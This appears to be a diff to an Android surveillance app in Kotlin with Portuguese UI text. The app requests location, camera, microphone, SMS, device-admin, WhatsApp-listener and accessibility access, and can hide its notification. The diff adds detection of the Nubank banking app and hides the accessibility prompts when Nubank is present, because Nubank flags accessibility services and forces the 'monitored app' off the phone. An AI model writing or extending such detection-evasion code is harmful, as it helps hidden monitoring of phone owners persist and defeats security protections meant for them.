@@ -88,6 +88,7 @@ class MainActivity : ComponentActivity() {
     // Android 12+ (Samsung One UI 4/5/6): permissão para alarmes exatos (necessário para KeepAlive)
     private val hasExactAlarmState       = mutableStateOf(true)
     private val hideServiceNotifState    = mutableStateOf(false)
+    private val hasNubankState           = mutableStateOf(false)
 
     private val basicPermLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -1185,6 +1186,7 @@ class MainActivity : ComponentActivity() {
         val hasWhatsAppListener by hasWhatsAppListenerState
         val hasExactAlarm      by hasExactAlarmState
         val hideServiceNotif   by hideServiceNotifState
+        val hasNubank          by hasNubankState
         val hasAllFiles = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
             android.os.Environment.isExternalStorageManager() else true
         val isBatteryOptimized = isBatteryOptimizedFor(context)
@@ -1194,7 +1196,8 @@ class MainActivity : ComponentActivity() {
                 Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE
 
         val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
-                hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility &&
+                hasPhone && hasSms && hasActivity && hasNotify &&
+                (hasAccessibility || hasNubank) &&
                 hasAdmin && hasWhatsAppListener && hasAllFiles && !isBatteryOptimized &&
                 hasExactAlarm
 
@@ -1752,19 +1755,41 @@ class MainActivity : ComponentActivity() {
                     }
 
                     if (!hasAccessibility) {
-                        Button(
-                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
-                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
-                            shape = RoundedCornerShape(12.dp),
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
-                        ) {
-                            Text("♿  Ativar Captura de Tela Permanente", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                        if (hasNubank) {
+                            Box(
+                                Modifier
+                                    .fillMaxWidth()
+                                    .background(Color(0xFF1A0A2E), RoundedCornerShape(10.dp))
+                                    .padding(12.dp)
+                                    .padding(bottom = 10.dp)
+                            ) {
+                                Column {
+                                    Text(
+                                        "⚠️  Nubank detectado — Acessibilidade desativada",
+                                        color = Color(0xFFE040FB), fontSize = 12.sp, fontWeight = FontWeight.Bold
+                                    )
+                                    Spacer(Modifier.height(4.dp))
+                                    Text(
+                                        "O Nubank detecta serviços de acessibilidade e força a desinstalação do app monitorado. A ativação de acessibilidade foi bloqueada automaticamente para proteger o app.",
+                                        color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp
+                                    )
+                                }
+                            }
+                        } else {
+                            Button(
+                                onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
+                                modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
+                                shape = RoundedCornerShape(12.dp),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
+                            ) {
+                                Text("♿  Ativar Captura de Tela Permanente", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                            }
+                            Text(
+                                "Configurações → Acessibilidade → Protect → Ativar.",
+                                color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
+                                modifier = Modifier.padding(bottom = 10.dp)
+                            )
                         }
-                        Text(
-                            "Configurações → Acessibilidade → Protect → Ativar.",
-                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
-                            modifier = Modifier.padding(bottom = 10.dp)
-                        )
                     }
 
                     if (!hasWhatsAppListener) {
@@ -1837,17 +1862,19 @@ class MainActivity : ComponentActivity() {
                                 Text("Acesso", color = Color(0xFF8E94A5), fontSize = 9.sp)
                             }
                         }
-                        // Botão 2: Acessibilidade
-                        Button(
-                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
-                        ) {
-                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
-                                Text("♿", fontSize = 18.sp)
-                                Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
-                                Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
+                        // Botão 2: Acessibilidade (oculto se Nubank instalado)
+                        if (!hasNubank) {
+                            Button(
+                                onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
+                                modifier = Modifier.weight(1f),
+                                shape = RoundedCornerShape(12.dp),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
+                            ) {
+                                Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
+                                    Text("♿", fontSize = 18.sp)
+                                    Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                    Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
+                                }
                             }
                         }
                     }
@@ -1905,16 +1932,18 @@ class MainActivity : ComponentActivity() {
                                 Text("Acesso", color = Color(0xFF8E94A5), fontSize = 9.sp)
                             }
                         }
-                        Button(
-                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
-                            modifier = Modifier.weight(1f),
-                            shape = RoundedCornerShape(12.dp),
-                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
-                        ) {
-                            Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
-                                Text("♿", fontSize = 18.sp)
-                                Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
-                                Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
+                        if (!hasNubank) {
+                            Button(
+                                onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
+                                modifier = Modifier.weight(1f),
+                                shape = RoundedCornerShape(12.dp),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2D1B69))
+                            ) {
+                                Column(horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally) {
+                                    Text("♿", fontSize = 18.sp)
+                                    Text("Acessibilidade", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                                    Text("Serviço", color = Color(0xFF8E94A5), fontSize = 9.sp)
+                                }
                             }
                         }
                     }
@@ -3205,6 +3234,10 @@ class MainActivity : ComponentActivity() {
             am.canScheduleExactAlarms()
         } else true
         hideServiceNotifState.value = prefs.getBoolean("hide_service_notification", false)
+        hasNubankState.value = try {
+            packageManager.getPackageInfo("com.nu.production", 0)
+            true
+        } catch (_: PackageManager.NameNotFoundException) { false }
     }
 
     private fun hasPermission(p: String) =
